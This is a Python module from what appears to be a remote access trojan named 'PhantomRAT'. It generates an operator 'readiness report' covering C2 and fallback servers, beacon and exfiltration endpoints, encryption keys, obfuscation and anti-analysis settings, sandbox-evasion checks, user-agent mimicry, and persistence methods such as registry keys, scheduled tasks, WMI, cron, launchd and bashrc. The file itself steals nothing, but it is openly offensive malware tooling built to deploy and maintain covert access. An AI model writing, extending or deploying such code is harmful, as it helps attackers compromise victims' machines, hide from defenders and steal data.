"""
Readiness reporting for PhantomRAT deployments.
Provides a lightweight assessment of configuration, crypto, obfuscation,
mimicry, evasion, and persistence posture for operator validation.
"""

import json
import os
import platform
from typing import Any, Dict, List


def _load_json(path: str) -> Dict[str, Any]:
    try:
        with open(path, 'r') as f:
            return json.load(f)
    except Exception:
        return {}


def _load_obfuscator_config() -> Dict[str, Any]:
    profile = _load_json('malleable_profile.json')
    obfuscator_profile = profile.get('obfuscation', {}) if profile else {}

    obfuscator_config = {
        'profile_defined': bool(obfuscator_profile),
        'complexity': obfuscator_profile.get('complexity'),
        'methods': obfuscator_profile.get('methods', []),
        'anti_analysis': obfuscator_profile.get('anti_analysis', False),
    }

    try:
        from phantomrat_obfuscator import ObfuscationConfig

        defaults = ObfuscationConfig()
        obfuscator_config.setdefault('complexity', defaults.complexity)
        obfuscator_config.setdefault('methods', ['multi'])
        obfuscator_config['metrics_enabled'] = defaults.enable_obfuscation_metrics
    except Exception:
        obfuscator_config['metrics_enabled'] = False

    return obfuscator_config


def _load_persistence_config() -> Dict[str, Any]:
    persistence_config = _load_json('persistence_config.json')
    return {
        'configured_methods': persistence_config.get('methods', []),
        'stealth_level': persistence_config.get('stealth_level', 'medium'),
        'watchdog_interval': persistence_config.get('watchdog_interval', 60),
        'self_heal': persistence_config.get('self_heal', True),
    }


def _available_persistence_methods() -> List[str]:
    try:
        from phantomrat_persistence import EnhancedPersistence

        manager = EnhancedPersistence()
        methods = []
        for method in manager.persistence_config.get('methods', []):
            if method == 'registry' and manager.is_windows:
                methods.append('registry')
            elif method == 'scheduled_task' and manager.is_windows:
                methods.append('scheduled_task')
            elif method == 'service' and (manager.is_windows or manager.is_linux):
                methods.append('service')
            elif method == 'startup_folder' and manager.is_windows:
                methods.append('startup_folder')
            elif method == 'cron' and (manager.is_linux or manager.is_macos):
                methods.append('cron')
            elif method == 'launchd' and manager.is_macos:
                methods.append('launchd')
            elif method == 'bashrc' and (manager.is_linux or manager.is_macos):
                methods.append('bashrc')
            elif method == 'wmi' and manager.is_windows:
                methods.append('wmi')
            elif method == 'file_association' and manager.is_windows:
                methods.append('file_association')
        return sorted(set(methods))
    except Exception:
        return []


def _load_evasion_profile() -> Dict[str, Any]:
    profile = _load_json('malleable_profile.json')
    evasion = profile.get('evasion', {}) if profile else {}
    return {
        'sleep_jitter': evasion.get('sleep_jitter'),
        'sandbox_indicators': evasion.get('sandbox_checks', []),
        'mimic_user_agent': profile.get('security', {}).get('user_agent') if profile else None,
    }


def generate_readiness_report(context: Dict[str, Any]) -> Dict[str, Any]:
    """Generate a readiness report with minimal side effects."""
    report = {
        'config': {
            'c2_server': context.get('c2_server'),
            'c2_fallbacks': context.get('c2_fallbacks', []),
            'beacon_endpoint': context.get('beacon_endpoint'),
            'exfil_endpoint': context.get('exfil_endpoint'),
            'user_agent': context.get('user_agent'),
            'profile_present': os.path.exists('malleable_profile.json'),
            'profile_source': context.get('profile_source', 'malleable_profile' if os.path.exists('malleable_profile.json') else 'default'),
            'profile_year': context.get('profile_year'),
            'mask_host': context.get('mask_host'),
            'verify_ssl': context.get('verify_ssl'),
        },
        'crypto': {
            'key_source': context.get('encryption_source', 'unknown'),
            'kdf_salt': context.get('kdf_salt'),
            'kdf_iterations': context.get('kdf_iterations'),
            'key_set': bool(context.get('encryption_key')),
        },
        'obfuscation': _load_obfuscator_config(),
        'persistence': {
            'config': _load_persistence_config(),
            'available_methods': _available_persistence_methods(),
        },
        'evasion': _load_evasion_profile(),
        'platform': {
            'system': platform.system(),
            'release': platform.release(),
            'version': platform.version(),
        },
    }

    report['mimicry'] = {
        'hostname': platform.node(),
        'user_agent': report['config']['user_agent'],
        'profile_alignment': bool(report['config']['profile_present']) and bool(report['config']['user_agent']),
    }

    report['tests_recommended'] = [
        'compileall',
        'network_reachability',
        'module_loader',
        'persistence_setup',
        'evasion_baseline',
    ]

    return report


if __name__ == '__main__':
    example_context = {
        'c2_server': 'http://127.0.0.1:8000',
        'beacon_endpoint': '/phantom/beacon',
        'exfil_endpoint': '/phantom/exfil',
        'user_agent': None,
        'encryption_source': 'default',
        'encryption_key': None,
        'kdf_salt': None,
        'kdf_iterations': None,
    }
    print(json.dumps(generate_readiness_report(example_context), indent=2))
